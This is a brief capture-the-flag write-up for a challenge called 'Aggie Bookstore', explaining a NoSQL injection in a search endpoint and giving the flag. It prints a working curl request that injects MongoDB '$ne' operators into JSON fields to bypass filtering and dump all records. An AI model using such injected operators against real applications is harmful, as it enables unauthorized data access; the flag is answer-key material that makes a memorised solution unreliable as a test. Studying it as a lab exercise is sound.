# Aggie Bookstore

Author: `moveslow`

Unfortunately it seems I've forgotten the name of my book...

## Solution

The POST request in the app is vulnerable to NoSQL injectiction. Although there is alphanumeric filtering for strings, dictionaries are allowed through unfiltered. This means MongoDB operators can be injected to list all of the books.

```
curl -X POST http://localhost:8000/search -H "Content-Type: application/json" -d '{"title": {"$ne": null}, "author": {"$ne": null}}'              
```

flag:
`gigem{nosql_n0_pr0bl3m}`
